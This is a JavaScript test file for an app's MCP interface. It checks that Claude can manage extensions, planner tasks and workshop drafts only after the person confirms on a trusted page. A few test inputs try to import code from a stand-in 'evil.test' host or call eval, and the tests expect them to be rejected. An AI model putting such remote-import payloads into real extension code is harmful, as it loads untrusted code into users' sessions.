  const r = await raw('POST', '/mcp', JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name, arguments: args } }), { 'Content-Type': 'application/json', Authorization: `Bearer ${tok}` })
  return JSON.parse(r.text).result
}

test('managing extensions over MCP: search, install with your click, switch, remove, publish, edit the listing', async () => {
  const ann = client(); const ben = client(); const cal = client()
  for (const [c, e] of [[ann, 'mgmt-ann'], [ben, 'mgmt-ben'], [cal, 'mgmt-cal']]) await c('POST', '/api/auth/signup', { email: `${e}@x.test`, password: 'pw-mgmt-1234' })
  const tea = await ann('POST', '/api/registry/publish', { name: 'tea', code: CODE.replace("title: 'Habits'", "title: 'Tea'").replaceAll('habits.', 'tea.'), visibility: 'public', changelog: 'First brew', manifest: { title: 'Tea', description: 'Cups of tea' } })
  assert.equal(tea.status, 201)
  const tok = await mcpToken(ben)
  const t = async (name, args) => { const r = await mcpTool(tok, name, args); return { ...r, text: r.content[0].text } }

  assert.match((await t('search_extensions', { query: 'tea' })).text, /mgmt-ann\/tea 0\.1\.0: Tea: Cups of tea \(by mgmt-ann/)
  const info = (await t('extension_info', { name: 'mgmt-ann/tea' })).text
  assert.match(info, /Not installed/)
  assert.match(info, /0\.1\.0: First brew/)

  // installing waits for the person: the request reaches every open console page; they confirm on the trusted page
  const page = sse(ben, '/api/live')
  await page.next('hello')
  const installing = t('install_extension', { name: 'mgmt-ann/tea' })
  const asked = await page.next('ask')
  assert.equal(asked.kind, 'install')
  assert.match(asked.text, /Install Tea \(mgmt-ann\/tea\) 0\.1\.0/)
  assert.equal((await ben('GET', '/api/plugins/installed')).body.plugins.length, 0, 'nothing installed before the click')
  await confirm(ben, new URLSearchParams({ do: 'install', ...asked.params }).toString())
  assert.match((await installing).text, /Done: they confirmed/)
  assert.match((await t('install_extension', { name: 'mgmt-ann/tea' })).text, /already installed/)

  // switching off and removing happen at once (and the console pages hear about it); switching on asks
  assert.match((await t('switch_extension', { name: 'mgmt-ann/tea', on: false })).text, /Switched off/)
  assert.match((await page.next('changed')).text, /switched off Tea/)
  assert.equal((await ben('GET', '/api/plugins/installed')).body.plugins[0].enabled, false)
  page.close()
  const noPage = await t('switch_extension', { name: 'mgmt-ann/tea', on: true })
  assert.match(noPage.text, /No Life Console page is open[\s\S]*\/trust\?do=toggle&pkg=mgmt-ann%2Ftea&on=1/)
  assert.equal((await ben('GET', '/api/plugins/installed')).body.plugins[0].enabled, false, 'still off until they confirm')
  assert.match((await t('remove_extension', { name: 'mgmt-ann/tea' })).text, /Removed/)
  assert.equal((await ben('GET', '/api/plugins/installed')).body.plugins.length, 0)
  assert.equal((await t('remove_extension', { name: 'mgmt-ann/tea' })).isError, true)

  // publishing the workshop's draft: only one that previews without errors
  assert.equal((await t('publish_extension', {})).isError, true, 'no draft yet')
  const code = "export default { sdk: 1, title: 'Steps', slots: { 'today.card': { mount(el) { el.textContent = '0 steps' } } } }\n"
  const workshop = sse(ben, '/api/workshop/live')
  await workshop.next('hello')
  const writing = t('write_draft', { code, name: 'steps' })
  const d = (await workshop.next('draft')).draft
  await ben('POST', '/api/workshop/live/result', { key: d.key, result: { ok: true, manifest: { title: 'Steps', description: 'Count steps', icon: 'directions_walk', slots: ['today.card'] } } })
  await writing
  const pub = await t('publish_extension', { changelog: 'First' })
  assert.match(pub.text, /Published mgmt-ben\/steps 0\.1\.0 \(private\)/)
  workshop.close()
  assert.equal((await cal('GET', '/api/registry/plugins/mgmt-ben/steps')).status, 404, 'private: others never see it')
  assert.match((await t('update_listing', { name: 'mgmt-ben/steps', title: 'Step counter', visibility: 'public' })).text, /Step counter · public/)
  assert.equal((await cal('GET', '/api/registry/plugins/mgmt-ben/steps')).body.title, 'Step counter')
  assert.equal((await t('update_listing', { name: 'mgmt-ann/tea', title: 'Mine now' })).isError, true, "someone else's listing")
  assert.match((await t('like_extension', { name: 'mgmt-ann/tea' })).text, /Liked mgmt-ann\/tea \(1 likes\)/)
})

test('planner over MCP: a separate permission on the trusted page, read today, add and change tasks, never other accounts', async () => {
  const dee = client(); const eve = client()
  for (const [c, e] of [[dee, 'plan-dee'], [eve, 'plan-eve']]) await c('POST', '/api/auth/signup', { email: `${e}@x.test`, password: 'pw-plan-1234' }, OWN_IP)
  const day = new Date().toISOString().slice(0, 10)
  const state = { schemaVersion: 2, settings: { timezone: 'UTC' }, todos: [
    { id: 'T-101', title: 'Write the abstract', timeMin: 45, done: false, priority: 2, scheduled: { date: day, start: '09:00' } },
    { id: 'T-102', title: 'Thesis chapter', done: false, scheduled: null },
    { id: 'T-103', title: 'Outline', done: false, parent: 'T-102', scheduled: null },
  ], timeBlocks: [{ id: 'B-1', date: day, start: '13:00', end: '14:00', title: 'Lab meeting', category: 'research' }], deadlines: [], plans: [] }
  assert.equal((await dee('PUT', '/api/state', { state, baseVersion: 0 })).status, 200)
  const tok = await mcpToken(dee)
  const t = async (name, args) => { const r = await mcpTool(tok, name, args); return { ...r, text: r.content[0].text } }

  // the workshop connection alone can't see the planner: the tool says where to ask
  const denied = await t('today')
  assert.equal(denied.isError, true)
  assert.match(denied.text, /separate permission[\s\S]*\/trust\?do=claude-planner/)
  assert.equal((await t('add_task', { title: 'x' })).isError, true)
  // no Claude connection yet: nothing to add access to
  assert.match((await eve('GET', '/trust?do=claude-planner', undefined, NAV)).text, /Connect Claude first/)

  const page = await dee('GET', '/trust?do=claude-planner', undefined, NAV)
  assert.match(page.text, /sends them to Anthropic/)
  await confirm(dee, 'do=claude-planner')
  const today = await t('today')
  assert.match(today.text, /T-101 Write the abstract \([^)]*09:00/)
  assert.match(today.text, /13:00-14:00 Lab meeting/)
  assert.match((await t('find_in_planner', { query: 'thesis' })).text, /T-102 Thesis chapter[^\n]*has subtasks/)

  const added = await t('add_task', { title: 'Email supervisor', date: day, start: '16:30', minutes: 15 })
  assert.equal(added.isError, undefined, added.text)
  assert.match(added.text, /T-104 Email supervisor/)
  assert.match((await t('change_task', { id: 'T-101', done: true })).text, /T-101[^\n]*done/)
  assert.match((await t('add_deadline', { title: 'Conference paper', due: `${day}T18:00` })).text, /DL-1 Conference paper/)
  assert.match((await t('add_deadline', { title: 'Old form', due: '2020-01-01' })).text, /DL-2 Old form/)
  const after = (await t('today')).text
  assert.match(after, /Deadlines passed, not marked done:\n- DL-2 Old form/)
  assert.doesNotMatch(after.split('Deadlines in the next 14 days:')[1], /Old form/, 'a passed deadline is not listed as coming up')
  // bad input and containers are refused, and nothing is written
  assert.equal((await t('change_task', { id: 'T-102', done: true })).isError, true, 'a task with subtasks is done when they are')
  assert.equal((await t('add_task', { title: 'Bad', date: 'tomorrow' })).isError, true)
  assert.equal((await t('change_task', { id: 'T-999', done: true })).isError, true)
  const doc = (await dee('GET', '/api/state')).body
  assert.equal(doc.state.todos.length, 4)
  assert.equal(doc.state.todos.find((x) => x.id === 'T-101').done, true)
  assert.equal(doc.state.todos.find((x) => x.id === 'T-102').done, false)
  assert.equal(doc.state.deadlines[0].due, `${day}T18:00`)
  assert.equal(doc.device, 'Claude')

  // planner access still opens only /mcp, never the rest of the API
  assert.equal((await raw('GET', '/api/state', undefined, { Authorization: `Bearer ${tok}` })).status, 401)
  // another account's token sees its own (empty) planner, never this one
  const evesTok = await mcpToken(eve)
  await confirm(eve, 'do=claude-planner')
  assert.doesNotMatch((await mcpTool(evesTok, 'find_in_planner', { query: '' })).content[0].text, /Email supervisor/)

  // switching it off, or connecting Claude again, takes planner access away
  await confirm(dee, 'do=claude-planner-off')
  assert.equal((await t('today')).isError, true)
  assert.equal((await t('list_extensions')).isError, undefined, 'the workshop keeps working')
  await confirm(dee, 'do=claude-planner')
  const fresh = await mcpToken(dee)
  assert.equal((await mcpTool(fresh, 'today')).isError, true, 'a new connection starts without planner access')
})

test('workshop drafts are checked on the server when no workshop is open', async () => {
  const fay = client()
  await fay('POST', '/api/auth/signup', { email: 'static-fay@x.test', password: 'pw-static-1234' }, OWN_IP)
  const tok = await mcpToken(fay)
  const broken = await mcpTool(tok, 'write_draft', { code: "export default { sdk: 1, title: 'Oops', pages: [ }\n", name: 'oops' })
  assert.equal(broken.isError, true)
  assert.match(broken.content[0].text, /isn't open[\s\S]*HAS ERRORS[\s\S]*syntax/)
  const evil = await mcpTool(tok, 'write_draft', { code: "export default { sdk: 1, title: 'E', start() { eval('1') } }\n" })
  assert.match(evil.content[0].text, /eval[\s\S]*publishing refuses/)
  const fine = await mcpTool(tok, 'write_draft', { code: "export const n = 1\nexport default { sdk: 1, title: 'Fine' }\n" })
  assert.equal(fine.isError, undefined, fine.content[0].text)
  assert.match(fine.content[0].text, /no errors/)
})

test('Settings → Claude: shows whether Claude is connected and may see the planner', async () => {
  const gus = client()
  await gus('POST', '/api/auth/signup', { email: 'set-gus@x.test', password: 'pw-set-12345' }, OWN_IP)
  assert.deepEqual((await gus('GET', '/api/claude')).body, { connected: false, planner: false })
  const tok = await mcpToken(gus)
  assert.deepEqual((await gus('GET', '/api/claude')).body, { connected: true, planner: false })
  await confirm(gus, 'do=claude-planner&back=/app%23/settings')
  assert.deepEqual((await gus('GET', '/api/claude')).body, { connected: true, planner: true })
  assert.equal((await raw('GET', '/api/claude', undefined, { Authorization: `Bearer ${tok}` })).status, 401, "Claude's own token can't read it")
  assert.equal((await gus('POST', '/api/claude', {})).status, 404, 'no way to switch it outside the trusted page')
})

// The server's previewer (server/previewer.mjs) against a real headless Chrome. Runs when PREVIEW_CHROME names a
// Chrome binary and the app is built (dist/preview.html); skipped otherwise.
const CHROME = process.env.PREVIEW_CHROME
test('server previewer: Claude previews, screenshots and clicks through a draft with no browser of theirs', { skip: !CHROME && 'set PREVIEW_CHROME to a Chrome binary' }, async () => {
  const { spawn } = await import('node:child_process')
  const fs = await import('node:fs')
  const os = await import('node:os')
  const path = await import('node:path')
  const dist = path.resolve(import.meta.dirname, '../dist')
  assert.ok(fs.existsSync(path.join(dist, 'preview.html')), 'npm run build first')
  const profile = fs.mkdtempSync(path.join(os.tmpdir(), 'lc-chrome-'))
  const port = 9300 + (process.pid % 500)
  const chrome = spawn(CHROME, ['--headless=new', `--remote-debugging-port=${port}`, `--user-data-dir=${profile}`, '--no-first-run',
    // like the previewer container (no internet): outside hosts never answer, so a request there would hang
    '--host-resolver-rules=MAP fonts.googleapis.com 10.255.255.1, MAP fonts.gstatic.com 10.255.255.1', 'about:blank'], { stdio: 'ignore' })
  let app2, s2
  try {
    for (let i = 0; i < 50; i++) { try { if ((await fetch(`http://127.0.0.1:${port}/json/version`)).ok) break } catch { /* starting */ } await new Promise((r) => setTimeout(r, 200)) }
    s2 = http.createServer((q, r) => app2.handler(q, r))
    await new Promise((r) => s2.listen(0, '127.0.0.1', r))
    const appPort = s2.address().port
    const cfg = loadConfig({ DATABASE_URL: dbUrl, PUSH_DRY_RUN: '1', APP_URL: `http://127.0.0.1:${appPort}`, DIST: dist, PREVIEWER_URL: `http://127.0.0.1:${port}`, TRUST_PROXY: '1' })
    app2 = await createApp({ cfg, db: conn.db, pool: conn.pool, log: quiet })
    const saveBase = base
    base = `http://127.0.0.1:${appPort}`
    try {
      const hal = client()
      await hal('POST', '/api/auth/signup', { email: 'prev-hal@x.test', password: 'pw-prev-1234' }, { 'X-Forwarded-For': '10.8.8.8' })
      const tok = await mcpToken(hal)
      const COUNTER = `export default { sdk: 1, title: 'Counter', pages: [{ title: 'Counter', mount(el) {
        let n = 0
        const draw = () => { el.innerHTML = '<div class="lc-card"><span class="lc-big">' + n + '</span> <button class="lc-btn" id="up">Add one</button><input id="name"></div>'; el.querySelector('#up').onclick = () => { n++; draw() } }
        draw()
      } }] }\n`
      const w = await mcpTool(tok, 'write_draft', { code: COUNTER, name: 'counter' })
      assert.equal(w.isError, undefined, w.content[0].text)
      assert.match(w.content[0].text, /Preview: works[\s\S]*\[Page 1: Counter\] 0 Add one/)
      assert.match((await mcpTool(tok, 'read_draft')).content[0].text, /Preview: works/, 'the result is kept for publish and use_draft')

      const p = await mcpTool(tok, 'preview_draft', { viewport: 'both', steps: [{ click: '#up' }, { click: 'text=Add one' }, { type: 'Ann', into: '#name' }] })
      assert.equal(p.isError, undefined, p.content[0].text)
      assert.match(p.content[0].text, /\[Page 1: Counter\] 2 Add one/)
      assert.match(p.content[0].text, /clicked #up[\s\S]*clicked text=Add one[\s\S]*typed "Ann" into #name/)
      const imgs = p.content.filter((x) => x.type === 'image')
      assert.equal(imgs.length, 2, 'phone and desktop')
      assert.equal(Buffer.from(imgs[0].data, 'base64').subarray(1, 4).toString(), 'PNG')

      // the step tools: choose in a select, text= prefers what you can act on, a picture mid-way, icons out of the text
      const FORM = `export default { sdk: 1, title: 'Form', pages: [{ title: 'Form', mount(el) {
        el.innerHTML = '<label>Go</label><span class="lc-icon">close</span><select id="s"><option value="a">Apple</option><option value="b">Banana</option></select><button id="go">Go</button><output id="o">none</output>'
        el.querySelector('#go').onclick = () => { el.querySelector('#o').textContent = 'picked ' + el.querySelector('#s').value }
      } }] }\n`
      await mcpTool(tok, 'write_draft', { code: FORM })
      const f = await mcpTool(tok, 'preview_draft', { steps: [{ select: '#s', value: 'Banana' }, { screenshot: 'before' }, { click: 'text=Go' }, { select: '#s', value: 'Cherry' }] })
      const ft = f.content[0].text
      assert.match(ft, /chose "Banana" in #s[\s\S]*clicked text=Go[\s\S]*no option "Cherry" \(has: Apple, Banana\)/)
      assert.match(ft, /\[Page 1: Form\] Go Apple Banana Go ?picked b/, 'text=Go clicked the button, not the label')
      assert.doesNotMatch(ft, /close/, 'icon names are left out of the text')
      assert.equal(f.content.filter((x) => x.type === 'image').length, 2, 'the mid-way picture and the final one')
      const many = await mcpTool(tok, 'preview_draft', { screenshots: false, steps: Array.from({ length: 85 }, () => ({ wait: 1 })) })
      assert.match(many.content[0].text, /only the first 80 of 85 steps run/)

      // several files and a curated library, run for real in the browser
      const split = await mcpTool(tok, 'write_draft', { files: {
        'index.js': "import { pct } from './fmt.js'\nexport default { sdk: 1, title: 'Split', pages: [{ title: 'Split', mount(el) { el.innerHTML = '<div class=\"lc-card\">' + pct(0.25) + '</div>' } }] }\n",
        'fmt.js': "import * as d3 from 'lc:d3'\nexport const pct = (x) => 'Share ' + d3.format('.0%')(x)\n",
      } })
      assert.equal(split.isError, undefined, split.content[0].text)
      assert.match(split.content[0].text, /\[Page 1: Split\] Share 25%/)
      const boom = await mcpTool(tok, 'write_draft', { code: "export default { sdk: 1, title: 'Boom', pages: [{ title: 'Boom', mount() { throw new Error('kaboom') } }] }\n" })
      assert.equal(boom.isError, true)
      assert.match(boom.content[0].text, /HAS ERRORS[\s\S]*kaboom/)
    } finally { base = saveBase }
  } finally {
    app2?.close(); s2?.close(); chrome.kill()
  }
})

test('live test: the draft runs on the real planner only after the trusted page, only its current version, with undo', async () => {
  const ivy = client(); const joe = client()
  for (const [c, e] of [[ivy, 'dev-ivy'], [joe, 'dev-joe']]) await c('POST', '/api/auth/signup', { email: `${e}@x.test`, password: 'pw-dev-12345' }, { 'X-Forwarded-For': '10.7.7.7' })
  assert.equal((await ivy('PUT', '/api/state', { state: { schemaVersion: 2, todos: [{ id: 'T-101', title: 'Before' }], timeBlocks: [], deadlines: [], plans: [] }, baseVersion: 0 })).status, 200)
  const tok = await mcpToken(ivy)
  assert.match((await ivy('GET', '/trust?do=dev-test', undefined, NAV)).text, /no draft to test/)
  const CODE1 = "export default { sdk: 1, title: 'Try', pages: [{ title: 'Try', mount(el) { el.textContent = 'one' } }] }\n"
  await mcpTool(tok, 'write_draft', { code: CODE1, name: 'try' })
  assert.deepEqual((await ivy('GET', '/api/workshop/dev')).body, { on: false })
  // Claude can only ask: without the person's click nothing runs
  const asked = await mcpTool(tok, 'live_test', { on: true })
  assert.match(asked.content[0].text, /\/trust\?do=dev-test/)
  assert.deepEqual((await ivy('GET', '/api/workshop/dev')).body, { on: false })
  const page = await ivy('GET', '/trust?do=dev-test', undefined, NAV)
  assert.match(page.text, /can change while it runs[\s\S]*60 minutes[\s\S]*Stop and undo/)
  await confirm(ivy, 'do=dev-test')
  const dev = (await ivy('GET', '/api/workshop/dev')).body
  assert.equal(dev.on, true); assert.equal(dev.undo, true); assert.match(dev.pkg, /\/try$/)
  const code = await ivy('GET', `/api/workshop/dev/code/${dev.key}.js`)
  assert.equal(code.status, 200); assert.equal(code.text, CODE1)
  assert.equal(code.headers.get('cache-control'), 'no-store')
  // only the current version, only for this person's browser session
  assert.equal((await joe('GET', `/api/workshop/dev/code/${dev.key}.js`)).status, 404)
  assert.equal((await raw('GET', `/api/workshop/dev/code/${dev.key}.js`, undefined, { Authorization: `Bearer ${tok}` })).status, 401)
  const edited = await mcpTool(tok, 'edit_draft', { old_text: "'one'", new_text: "'two'" })
  assert.match(edited.content[0].text, /Live test on/)
  assert.equal((await ivy('GET', `/api/workshop/dev/code/${dev.key}.js`)).status, 404, 'an old version no longer loads')
  const dev2 = (await ivy('GET', '/api/workshop/dev')).body
  assert.match((await ivy('GET', `/api/workshop/dev/code/${dev2.key}.js`)).text, /'two'/)
  // a version that fails the publishing checks never loads
  await mcpTool(tok, 'write_draft', { code: "export default { sdk: 1, title: 'Try', start() { eval('1') } }\n" })
  const bad = (await ivy('GET', '/api/workshop/dev')).body
  assert.equal((await ivy('GET', `/api/workshop/dev/code/${bad.key}.js`)).status, 409)
  await mcpTool(tok, 'write_draft', { code: CODE1 })

  // the planner changes during the test; Stop and undo puts it back
  const cur = (await ivy('GET', '/api/state')).body
  await ivy('PUT', '/api/state', { state: { ...cur.state, todos: [{ id: 'T-101', title: 'Changed by the draft' }] }, baseVersion: cur.version })
  const stop = await ivy('POST', '/api/workshop/dev/stop', { undo: true })
  assert.equal(stop.body.restored, true)
  assert.equal((await ivy('GET', '/api/state')).body.state.todos[0].title, 'Before')
  assert.deepEqual((await ivy('GET', '/api/workshop/dev')).body, { on: false })
  assert.equal((await ivy('GET', `/api/workshop/dev/code/${dev.key}.js`)).status, 404, 'off: nothing loads')

  // Claude can switch it off itself (never on)
  await confirm(ivy, 'do=dev-test')
  assert.equal((await ivy('GET', '/api/workshop/dev')).body.on, true)
  assert.match((await mcpTool(tok, 'live_test', { on: false })).content[0].text, /Stopped/)
  assert.equal((await ivy('GET', '/api/workshop/dev')).body.on, false)
})

test('open_extension works with no workshop open: the installed version, theirs to edit or a copy', async () => {
  const kim = client(); const lee = client()
  for (const [c, e] of [[kim, 'open-kim'], [lee, 'open-lee']]) await c('POST', '/api/auth/signup', { email: `${e}@x.test`, password: 'pw-open-1234' }, { 'X-Forwarded-For': '10.6.6.6' })
  const pub = await kim('POST', '/api/registry/publish', { name: 'notes', code: CODE.replace("title: 'Habits'", "title: 'Notes'").replaceAll('habits.', 'notes.'), visibility: 'public', manifest: { title: 'Notes' } })
  assert.equal(pub.status, 201, JSON.stringify(pub.body))
  const kt = await mcpToken(kim)
  const mine = await mcpTool(kt, 'open_extension', { name: pub.body.name })
  assert.equal(mine.isError, undefined, mine.content[0].text)
  assert.match(mine.content[0].text, /Editing their extension[\s\S]*The files:[\s\S]*notes\.Habit/)
  const lt = await mcpTool(await mcpToken(lee), 'open_extension', { name: pub.body.name })
  assert.match(lt.content[0].text, /Their own copy of/)
})

test('an extension in several files: published, hashed and served together; library imports point at /vendor/', async () => {
  const ola = client()
  await ola('POST', '/api/auth/signup', { email: 'files-ola@x.test', password: 'pw-files-1234' }, { 'X-Forwarded-For': '10.5.5.5' })
  const files = {
    'index.js': "import { label } from './lib/label.js'\nimport * as d3 from 'lc:d3'\nexport default { sdk: 1, title: 'Split', pages: [{ title: 'Split', mount(el) { el.textContent = label(d3.format('.0%')(0.5)) } }] }\n",
    'lib/label.js': 'export const label = (x) => `Half: ${x}`\n',
  }
  const pub = await ola('POST', '/api/registry/publish', { name: 'split', files, visibility: 'public', manifest: { title: 'Split' } })
  assert.equal(pub.status, 201, JSON.stringify(pub.body))
  const { filesHash } = await import('../server/registry.mjs')
  assert.equal(pub.body.hash, filesHash(pub.body.name, files), 'one hash over every file')
  const entry = await ola('GET', `/api/registry/code/${pub.body.hash}/index.js`)
  assert.equal(entry.status, 200)
  assert.match(entry.text, /from "\/vendor\/d3\.js"/, 'the console gets the library from this server')
  assert.match(entry.text, /from '\.\/lib\/label\.js'/, 'relative imports stay relative (they resolve next to it)')
  assert.match((await ola('GET', `/api/registry/code/${pub.body.hash}/index.js?raw=1`)).text, /from 'lc:d3'/, 'raw: exactly as published')
  assert.match((await ola('GET', `/api/registry/code/${pub.body.hash}/lib/label.js`)).text, /Half/)
  assert.equal((await ola('GET', `/api/registry/code/${pub.body.hash}/nope.js`)).status, 404)
  assert.deepEqual((await ola('GET', `/api/registry/files/${pub.body.hash}`)).body.files, files)
  assert.deepEqual((await raw('GET', `/api/registry/public/versions/${pub.body.hash}`)).text && JSON.parse((await raw('GET', `/api/registry/public/versions/${pub.body.hash}`)).text).files.sort(), ['index.js', 'lib/label.js'])
  // a one-file version keeps its old hash and address
  const one = await ola('POST', '/api/registry/publish', { name: 'one', code: "export default { sdk: 1, title: 'One' }\n", manifest: {} })
  assert.match((await ola('GET', `/api/registry/code/${one.body.hash}.js`)).text, /One/)
  // nothing from elsewhere, and imports must be its own files
  const evil = await ola('POST', '/api/registry/publish', { name: 'evil', files: { 'index.js': "import 'https://evil.test/x.js'\nexport default { sdk: 1 }\n" }, manifest: {} })
  assert.equal(evil.status, 422)
  const missing = await ola('POST', '/api/registry/publish', { name: 'gap', files: { 'index.js': "import './gone.js'\nexport default { sdk: 1 }\n" }, manifest: {} })
  assert.equal(missing.status, 422)
})

test('workshop drafts in several files, saved in the database: a restart keeps them', async () => {
  const pam = client()
  await pam('POST', '/api/auth/signup', { email: 'files-pam@x.test', password: 'pw-files-1234' }, { 'X-Forwarded-For': '10.5.5.6' })
  const tok = await mcpToken(pam)
  const w = await mcpTool(tok, 'write_draft', { name: 'parts', files: { 'index.js': "import { n } from './n.js'\nexport default { sdk: 1, title: 'Parts', pages: [{ title: 'P', mount(el) { el.textContent = n } }] }\n", 'n.js': 'export const n = 1\n' } })
  assert.equal(w.isError, undefined, w.content[0].text)
  assert.equal((await mcpTool(tok, 'write_file', { path: 'm.js', code: 'export const m = 2\n' })).isError, undefined)
  assert.equal((await mcpTool(tok, 'edit_draft', { file: 'n.js', old_text: 'n = 1', new_text: 'n = 3' })).isError, undefined)
  assert.equal((await mcpTool(tok, 'edit_draft', { file: 'nope.js', old_text: 'a', new_text: 'b' })).isError, true)
  assert.equal((await mcpTool(tok, 'delete_file', { path: 'index.js' })).isError, true, 'the entry stays')
  assert.equal((await mcpTool(tok, 'delete_file', { path: 'm.js' })).isError, undefined)
  const bad = await mcpTool(tok, 'write_file', { path: 'n.js', code: "import x from 'https://evil.test/x.js'\nexport const n = x\n" })
  assert.equal(bad.isError, true)
  assert.match(bad.content[0].text, /only its own files/)
  await mcpTool(tok, 'write_file', { path: 'n.js', code: 'export const n = 3\n' })
  const read = (await mcpTool(tok, 'read_draft')).content[0].text
  assert.match(read, /--- index\.js ---[\s\S]*--- n\.js ---\nexport const n = 3/)
  assert.doesNotMatch(read, /m\.js/)

  // a fresh room (as after a restart or deploy) loads the saved draft
  await new Promise((r) => setTimeout(r, 200)) // saving runs in the background
  const { createWorkshopLive } = await import('../server/workshop-live.mjs')
  const me = (await pam('GET', '/api/auth/me')).body
  const fresh = createWorkshopLive({ db: conn.db })
  await fresh.ensure(me.user?.id ?? me.id)
  const d = fresh.draft(me.user?.id ?? me.id)
  assert.deepEqual(Object.keys(d.files).sort(), ['index.js', 'n.js'])
  assert.equal(d.files['n.js'], 'export const n = 3\n')
  assert.equal(d.slug, 'parts')
  fresh.close()
})
